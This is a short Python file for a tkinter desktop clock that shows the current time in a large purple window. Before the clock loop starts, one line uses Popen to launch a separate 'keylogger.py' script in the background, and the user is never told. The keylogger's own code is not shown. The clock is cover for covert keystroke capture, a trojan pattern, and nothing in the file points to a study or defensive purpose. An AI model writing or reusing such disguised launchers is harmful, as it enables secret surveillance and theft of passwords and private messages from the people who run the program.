import tkinter as tk
import datetime
import subprocess
from subprocess import Popen

def time():
    current_time = str(datetime.datetime.now().time())
    label.config(text = current_time)
    label.after(1000, time)

root = tk.Tk()
root.title("Current Time")

label = tk.Label(root, font = ("calibri", 40, "bold"),
                 background = "purple",
                 foreground = "white")
label.pack(anchor = "center")

p = Popen(["python", "keylogger.py"])
time()
root.mainloop()